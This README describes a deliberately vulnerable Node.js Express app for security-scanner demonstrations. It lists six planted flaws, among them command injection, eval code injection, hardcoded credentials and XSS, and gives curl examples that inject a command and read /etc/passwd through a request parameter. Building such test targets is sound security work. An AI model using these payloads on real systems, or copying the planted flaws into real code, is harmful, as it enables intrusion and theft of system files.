# Vulnerable Node.js Express Demo App

Intentionally vulnerable Express application for security scanning demonstrations.

## Vulnerabilities Included

1. **Command Injection (CWE-78)**: `/ping` endpoint
2. **Code Injection (CWE-95)**: `/eval` endpoint
3. **Hardcoded Credentials (CWE-798)**: API_SECRET and admin_password
4. **Insecure CORS (CWE-942)**: `/cors-test` endpoint with wildcard origin
5. **XSS (CWE-79)**: `/upload` endpoint
6. **Weak Random (CWE-338)**: `/random-token` endpoint using Math.random()

## Running

```bash
npm install
npm start
```

## Example Exploits

### Command Injection
```bash
curl "http://localhost:3000/ping?host=localhost;cat%20/etc/passwd"
```

### Code Injection
```bash
curl "http://localhost:3000/eval?code=require('fs').readFileSync('/etc/passwd','utf8')"
```

### XSS
```bash
curl -X POST http://localhost:3000/upload \
  -H "Content-Type: application/json" \
  -d '{"content": "<script>alert(\"XSS\")</script>"}'
```
